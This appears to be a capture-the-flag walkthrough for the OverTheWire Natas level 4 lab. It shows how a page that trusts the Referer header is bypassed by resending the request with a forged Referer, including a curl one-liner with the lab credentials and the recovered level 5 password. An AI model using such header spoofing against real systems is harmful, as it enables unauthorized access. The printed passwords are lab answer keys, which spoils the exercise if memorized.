On this page, it says this:
```html
Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
```

with a "Refresh Page" button. The "Refresh page" button is just a link to `index.php`

Pressing the "Refresh Page" button, the text changes to this:
```html
Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
```

So the page is detecting where we are coming from, but how?

My guess is that the http request that the "Refresh Page" button is sending has a `Referer` header. The `Referer` contains the absolute or partial address from which resource has been requested. It allows a server to identify referring pages that people are visiting from or where requested resources are being used

If I check the headers for the page when I hit the "Refresh Page" button, I can see the `Referer` header like this:
```
|Referer|[http://natas4.natas.labs.overthewire.org/]
```

So the page is probably using the `Referer` header to detect where we're coming from

So how can we exploit this. We can resend an http request with a modified `Referer`. I used the `resend request` in the inspector page and we get this response:
```html
Access granted. The password for natas5 is Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD
```

Alternatively, we can use curl to send a request:
```sh
curl -u natas4:tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm --referer http://natas5.natas.labs.overthewire.org/ http://natas4.natas.labs.overthewire.org
```